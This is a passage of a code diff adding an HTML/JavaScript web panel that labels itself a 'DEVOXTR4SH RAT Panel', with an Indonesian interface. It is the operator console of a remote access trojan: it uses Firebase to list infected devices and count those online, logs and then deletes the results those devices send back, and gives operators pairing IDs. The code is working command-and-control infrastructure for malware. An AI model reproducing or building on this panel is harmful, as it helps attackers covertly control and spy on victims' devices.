+                    deviceList.innerHTML = `
+                            <div class="empty">
+                                <span class="material-symbols-outlined">devices</span>
+                                <p>Belum ada perangkat terhubung.</p>
+                            </div>
+                        `;
+                    totalDevicesEl.textContent = '0';
+                    onlineDevicesEl.textContent = '0';
+                    return;
+                }
+
+                const deviceIds = Object.keys(data);
+                total = deviceIds.length;
+
+                deviceIds.forEach(id => {
+                    const deviceData = data[id];
+                    if (deviceData.online) online++;
+                    const card = renderDevice(id, deviceData);
+                    deviceList.appendChild(card);
+                });
+
+                totalDevicesEl.textContent = total;
+                onlineDevicesEl.textContent = online;
+                addLog(`📡 ${total} perangkat, ${online} online`, 'success');
+            });
+        }
+
+        // ============================================================
+        // LISTEN RESPONSES
+        // ============================================================
+        function listenResponses() {
+            const respRef = ref(db, 'responses');
+            onValue(respRef, (snapshot) => {
+                const data = snapshot.val();
+                if (!data) return;
+                Object.entries(data).forEach(([id, resp]) => {
+                    if (resp && resp.result) {
+                        addLog(`📥 [${id.slice(0, 8)}] ${resp.result}`, 'info');
+                        remove(ref(db, `responses/${id}`)).catch(() => {});
+                    }
+                });
+            });
+        }
+
+        // ============================================================
+        // AUTH STATE
+        // ============================================================
+        onAuthStateChanged(auth, async (user) => {
+            if (!user) {
+                window.location.href = 'login.html';
+                return;
+            }
+
+            currentUser = user;
+            const uid = user.uid;
+
+            // Ambil atau buat pairing ID
+            const userRef = ref(db, `users/${uid}/pairingId`);
+            const snap = await get(userRef);
+            if (snap.exists()) {
+                pairingId = snap.val();
+            } else {
+                pairingId = generatePairingId(uid);
+                await set(userRef, pairingId);
+            }
+
+            pairingIdEl.textContent = pairingId;
+            addLog(`🔑 Pairing ID: ${pairingId}`, 'success');
+            showToast(`Pairing ID: ${pairingId}`, 3000);
+
+            loadDevices();
+            listenResponses();
+        });
+
+        // ============================================================
+        // INIT
+        // ============================================================
+        addLog('🚀 DEVOXTR4SH RAT Panel loaded', 'success');
+        console.log('🔥 DEVOXTR4SH RAT Panel loaded');
+    </script>
+</body>
+  </html>
